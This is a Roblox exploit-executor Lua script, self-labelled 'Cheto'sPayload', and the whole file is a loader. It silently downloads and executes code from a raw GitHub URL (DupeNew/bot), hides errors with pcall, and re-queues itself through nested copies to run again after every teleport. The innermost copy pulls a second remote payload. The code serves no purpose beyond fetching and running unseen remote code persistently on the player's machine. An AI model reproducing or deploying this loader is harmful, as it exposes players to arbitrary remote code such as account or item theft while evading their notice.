local Players = game:GetService("Players")
local player = Players.LocalPlayer
local jobId = game.JobId
local mainScriptUrl = "https://raw.githubusercontent.com/DupeNew/bot/refs/heads/main/faaass"
local executionKey = "Cheto'sPayload_Continuous_" .. player.UserId .. "_" .. jobId
if getgenv()[executionKey] then return end
getgenv()[executionKey] = true
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet(mainScriptUrl))()
    end)
end)
local function missing(t, f, fallback)
    if type(f) == t then return f end
    return fallback
end
local queueteleport = missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))
local scriptToQueue = [[
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local jobId = game.JobId
local mainScriptUrl = "https://raw.githubusercontent.com/DupeNew/bot/refs/heads/main/faaass"
local executionKey = "Cheto'sPayload_Continuous_" .. player.UserId .. "_" .. jobId
if getgenv()[executionKey] then return end
getgenv()[executionKey] = true
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet(mainScriptUrl))()
    end)
end)
local function missing(t, f, fallback)
    if type(f) == t then return f end
    return fallback
end
local queueteleport = missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))
if queueteleport then
    Players.LocalPlayer.OnTeleport:Connect(function(State)
        pcall(queueteleport, ]] .. string.format("%q", [[
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local jobId = game.JobId
local mainScriptUrl = "https://raw.githubusercontent.com/DupeNew/bot/refs/heads/main/faaass"
local executionKey = "Cheto'sPayload_Continuous_" .. player.UserId .. "_" .. jobId
if getgenv()[executionKey] then return end
getgenv()[executionKey] = true
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet(mainScriptUrl))()
    end)
end)
local function missing(t, f, fallback)
    if type(f) == t then return f end
    return fallback
end
local queueteleport = missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))
if queueteleport then
    Players.LocalPlayer.OnTeleport:Connect(function(State)
        pcall(queueteleport, loadstring(game:HttpGet("https://raw.githubusercontent.com/DupeNew/bot/refs/heads/main/dos"))())
    end)
end
]]) .. [[)
    end)
end
]]
if queueteleport then
    Players.LocalPlayer.OnTeleport:Connect(function(State)
        if State == Enum.TeleportState.Started then
            pcall(queueteleport, scriptToQueue)
        end
    end)
end
